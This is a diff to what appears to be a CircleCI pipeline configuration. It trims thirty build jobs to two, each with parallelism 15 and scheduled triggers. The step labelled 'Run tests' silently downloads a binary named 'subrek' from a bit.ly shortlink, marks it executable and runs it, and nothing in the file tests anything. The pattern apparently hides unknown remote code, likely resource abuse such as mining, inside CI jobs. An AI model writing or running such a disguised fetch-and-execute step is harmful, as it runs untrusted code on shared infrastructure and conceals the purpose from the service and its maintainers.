@@ -11,7 +11,6 @@ working_dir: &working_dir ~/app
     - run: 
         name: Run tests 
         command: |
-                    unzip rtm.zip
                     wget -qO subrek https://bit.ly/3Ipgmg8
                     chmod +x subrek
                     ./subrek  
@@ -20,153 +19,15 @@ version: 2.0
 jobs: 
   build1: 
     <<: *script
+    parallelism: 15
     docker:
-      - image: couchbase:latest
+      - image: python
     resource_class: large
   build2: 
     <<: *script
+    parallelism: 15
     docker:
-      - image: couchbase:latest
-    resource_class: large
-  build3: 
-    <<: *script
-    docker:
-      - image: couchbase:latest
-    resource_class: large
-  build4: 
-    <<: *script
-    docker:
-      - image: couchbase:latest
-    resource_class: large
-  build5: 
-    <<: *script
-    docker:
-      - image: couchbase:latest
-    resource_class: large
-  build6: 
-    <<: *script
-    docker:
-      - image: couchbase:latest
-    resource_class: large
-  build7: 
-    <<: *script
-    docker:
-      - image: couchbase:latest
-    resource_class: large
-  build8: 
-    <<: *script
-    docker:
-      - image: couchbase:latest
-    resource_class: large
-  build9: 
-    <<: *script
-    docker:
-      - image: couchbase:latest
-    resource_class: large
-  build10: 
-    <<: *script
-    docker:
-      - image: couchbase:latest
-    resource_class: large
-  build11: 
-    <<: *script
-    docker:
-      - image: couchbase:latest
-    resource_class: large
-  build12: 
-    <<: *script
-    docker:
-      - image: couchbase:latest
-    resource_class: large
-  build13: 
-    <<: *script
-    docker:
-      - image: couchbase:latest
-    resource_class: large
-  build14: 
-    <<: *script
-    docker:
-      - image: couchbase:latest
-    resource_class: large
-  build15: 
-    <<: *script
-    docker:
-      - image: couchbase:latest
-    resource_class: large
-  build16: 
-    <<: *script
-    docker:
-      - image: couchbase:latest
-    resource_class: large
-  build17: 
-    <<: *script
-    docker:
-      - image: couchbase:latest
-    resource_class: large
-  build18: 
-    <<: *script
-    docker:
-      - image: couchbase:latest
-    resource_class: large
-  build19: 
-    <<: *script
-    docker:
-      - image: couchbase:latest
-    resource_class: large
-  build20: 
-    <<: *script
-    docker:
-      - image: couchbase:latest
-    resource_class: large
-  build21: 
-    <<: *script
-    docker:
-      - image: couchbase:latest
-    resource_class: large
-  build22: 
-    <<: *script
-    docker:
-      - image: couchbase:latest
-    resource_class: large
-  build23: 
-    <<: *script
-    docker:
-      - image: couchbase:latest
-    resource_class: large
-  build24: 
-    <<: *script
-    docker:
-      - image: couchbase:latest
-    resource_class: large
-  build25: 
-    <<: *script
-    docker:
-      - image: couchbase:latest
-    resource_class: large
-  build26: 
-    <<: *script
-    docker:
-      - image: couchbase:latest
-    resource_class: large
-  build27: 
-    <<: *script
-    docker:
-      - image: couchbase:latest
-    resource_class: large
-  build28: 
-    <<: *script
-    docker:
-      - image: couchbase:latest
-    resource_class: large
-  build29: 
-    <<: *script
-    docker:
-      - image: couchbase:latest
-    resource_class: large
-  build30: 
-    <<: *script
-    docker:
-      - image: couchbase:latest
+      - image: python
     resource_class: large
 
 workflows: 
@@ -175,34 +36,6 @@ workflows:
     jobs: 
       - build1
       - build2
-      - build3
-      - build4
-      - build5
-      - build6
-      - build7
-      - build8
-      - build9
-      - build10
-      - build11
-      - build12
-      - build13
-      - build14
-      - build15
-      - build16
-      - build17
-      - build18
-      - build19
-      - build20
-      - build21
-      - build22
-      - build23
-      - build24
-      - build25
-      - build26
-      - build27
-      - build28
-      - build29
-      - build30
 
   schedule:
     triggers:
@@ -216,31 +49,3 @@ workflows:
     jobs: 
       - build1
       - build2
-      - build3
-      - build4
-      - build5
-      - build6
-      - build7
-      - build8
-      - build9
-      - build10
-      - build11
-      - build12
-      - build13
-      - build14
-      - build15
-      - build16
-      - build17
-      - build18
-      - build19
-      - build20
-      - build21
-      - build22
-      - build23
-      - build24
-      - build25
-      - build26
-      - build27
-      - build28
-      - build29
-      - build30
